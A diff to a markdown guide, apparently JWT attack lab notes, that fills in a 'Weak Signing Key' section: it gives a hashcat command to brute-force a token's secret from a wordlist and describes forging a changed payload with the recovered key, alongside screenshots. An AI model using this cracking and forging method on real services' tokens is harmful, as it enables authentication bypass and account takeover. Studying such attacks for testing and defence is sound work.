@@ -21,7 +21,18 @@ If a server accepts alg: "none" and skips signature verification, an attacker ca
 <img width="1536" height="1024" alt="JWT_Bypass" src="./img/ss4.png" />
 
 ### >_ Weak Signing Key
-Will be continue..
+It brute‑forces the JWT secret using hashcat. Then, using the recovered secret, change the JWT payload on "jwt.io".
+
+```
+ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list 
+```
+
+<img width="1536" height="1024" alt="JWT_Bypass" src="./img/ss5.png" />
+
+<img width="1536" height="1024" alt="JWT_Bypass" src="./img/ss6.png" />
+
+<img width="1536" height="1024" alt="JWT_Bypass" src="./img/ss7.png" />
+
 
 ### >_ JWK Header Injection
 Will be continue..
